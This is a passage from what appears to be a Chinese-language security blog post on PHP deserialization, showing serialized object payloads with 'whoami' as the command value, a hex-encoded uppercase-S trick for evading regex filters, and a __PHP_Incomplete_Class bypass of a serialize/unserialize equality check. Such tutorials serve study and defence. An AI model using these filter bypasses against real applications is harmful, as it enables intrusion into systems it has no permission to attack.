  <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exp</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Exp</span>));</span><br><span class="line"><span class="comment">// a:1:&#123;i:0;O:3:&quot;Exp&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="大写S十六进制编码"><a href="#大写S十六进制编码" class="headerlink" title="大写S十六进制编码"></a>大写S十六进制编码</h4><p>如果对某个必要参数名进行了正则过滤，例如对上文中<code>O:3:&quot;Exp&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code>的<code>cmd</code>进行了过滤，我们可以通过大写<code>S</code>，然后十六进制编码<code>cmd</code>中的任意一个字符即可：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;Exp&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">3</span>:<span class="string">&quot;\63md&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;whoami&quot;</span>;&#125;</span><br><span class="line"><span class="comment">// 注意这里十六进制编码前需要加上反斜杠，同时修改该值前的s变为大写S</span></span><br></pre></td></tr></table></figure></div>

<h4 id="PHP-7-1-类属性不敏感"><a href="#PHP-7-1-类属性不敏感" class="headerlink" title="PHP 7.1+类属性不敏感"></a>PHP 7.1+类属性不敏感</h4><p>PHP 7.1以上版本对于类成员属性不敏感，例如</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exp</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$cmd</span>;   <span class="comment">// private属性序列化时会产生空字节 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对于这个类，在PHP 7.1+的版本下，我们构造Exp时也可以用以下的方式构造：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exp</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;ls&quot;</span>;   <span class="comment">// 这里修改为public属性也是可以正常反序列化的</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Exp</span>);</span><br></pre></td></tr></table></figure></div>

<h4 id="拷贝"><a href="#拷贝" class="headerlink" title="拷贝"></a>拷贝</h4><p>这里主要作用是可以<strong>将某个成员的值与另外一个成员的值保持一致</strong>。</p>
<h4 id="PHP-Incomplete-Class"><a href="#PHP-Incomplete-Class" class="headerlink" title="__PHP_Incomplete_Class"></a>__PHP_Incomplete_Class</h4><p>当我们反序列化一个<strong>不存在的类</strong>时，我们得到的对象就会转换为<code>__PHP_Incomplete_Class</code>这种形式，同时会将原始的类名储存在<code>__PHP_Incomplete_Class_Name</code>属性中。</p>
<p>例如：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;Hack&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;&#x27;</span>));</span><br></pre></td></tr></table></figure></div>

<p>我们可以得到：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">object(__PHP_Incomplete_Class)#1 (2) &#123;</span><br><span class="line">  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;</span><br><span class="line">  string(4) &quot;Hack&quot;</span><br><span class="line">  [&quot;cmd&quot;]=&gt;</span><br><span class="line">  string(6) &quot;whoami&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于这个不存在的类名储存在<code>__PHP_Incomplete_Class_Name</code>属性中，因此我们在对其进行序列化时，PHP会自动恢复这个类的相关信息并进行绑定，并不会出现<code>__PHP_Incomplete_Class</code>这样的类名：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;Hack&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;&#x27;</span>)));</span><br></pre></td></tr></table></figure></div>

<p>得到：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">string(38) &quot;O:4:&quot;Hack&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以推断出，PHP是通过对类名进行检测，如果类名为<code>__PHP_Incomplete_Class</code>就会去根据<code>__PHP_Incomplete_Class_Name</code>寻找需要绑定的类。</p>
<p>那么如果我们遇到了如下的代码：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$x</span>)) != <span class="variable">$x</span></span><br></pre></td></tr></table></figure></div>

<p>这个时候就可以利用这个特性来进行绕过：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:1:&quot;a&quot;;O:7:&quot;classes&quot;:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>在这里我们将类名定义为<code>__PHP_Incomplete_Class</code>，但是并没有注册<code>__PHP_Incomplete_Class_Name</code>属性，无法找到与其对应绑定的类，因此序列化字节流中的其他属性就会被丢弃，最终得到如下的序列化字节流：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:22:&quot;__PHP_Incomplete_Class&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure></div>

<p>此时得到的字节流与原本的字节流并不相同，便可以通过这段代码的判断。</p>
<h4 id="闭包函数的序列化"><a href="#闭包函数的序列化" class="headerlink" title="闭包函数的序列化"></a>闭包函数的序列化</h4><p>PHP5.3后引入了闭包函数的概念，我们可以声明一个匿名函数并将其进行赋值。<br>但是我们无法直接对闭包函数进行序列化，需要借助<code>opis/closure</code>第三方组件来实现闭包函数的序列化。</p>
<h4 id="sleep触发的情景"><a href="#sleep触发的情景" class="headerlink" title="__sleep触发的情景"></a>__sleep触发的情景</h4><p>PHP在SESSION执行反序列化时会调用对应类的<code>__sleep</code>方法，可以去撕一下PHP的源码看看原因，还是非常容易看出来的。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://zhuanlan.zhihu.com/p/405838002" >https://zhuanlan.zhihu.com/p/405838002<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/7366" >https://xz.aliyun.com/t/7366<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/9545" >https://xz.aliyun.com/t/9545<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/" >https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://goodapple.top/archives/1945" >https://goodapple.top/archives/1945<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/m0_51078229/article/details/122868851" >https://blog.csdn.net/m0_51078229/article/details/122868851<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
</search>
